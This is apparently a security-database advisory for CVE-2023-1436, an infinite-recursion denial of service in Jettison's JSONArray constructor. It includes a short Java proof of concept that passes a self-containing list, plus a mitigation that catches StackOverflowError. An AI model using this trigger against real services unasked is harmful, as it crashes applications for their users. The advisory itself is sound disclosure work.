{"hash":"56f780f659c385d8fd6e3573e8ffe02118ee969c","data":{"post":{"title":"Jettison JSONArray DoS","path":"/vulnerabilities/jettison-json-array-dos-xray-427911/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Infinite recursion in Jettison leads to denial of service when creating a crafted JSONArray</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>org.codehaus.jettison:jettison</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,1.5.4)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>An infinite recursion is triggered in Jettison when constructing a JSONArray from a Collection that contains a self-reference in one of its elements. This leads to a StackOverflowError exception being thrown.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-java\">public class POC {\n    public static void main(String[] args) throws JSONException {\n        ArrayList&#x3C;Object> list = new ArrayList&#x3C;>();\n        list.add(list);\n        JSONArray jsonArray = new JSONArray(list);\n    }\n}\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>Wrap Jettison's <code>JSONArray</code> constructor with exception handling -</p>\n<pre><code class=\"language-java\">try {\n    JSONArray jsonArray = new JSONArray(list);\n}\ncatch(StackOverflowError e) {\n    System.err.println(\"ERROR: Stack limit reached\");\n}\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p>No references are supplied for this issue</p>\n","description":"CVE-2023-1436 Medium severity. Infinite recursion in Jettison leads to denial of service when creating a crafted JSONArray","date_published":"2023-03-16","xray_id":"XRAY-427911","vul_id":"CVE-2023-1436","severity":"medium","discovered_by":"Nitay Meiron","last_updated":"2023-03-16","cvss":5.9}},"context":{}}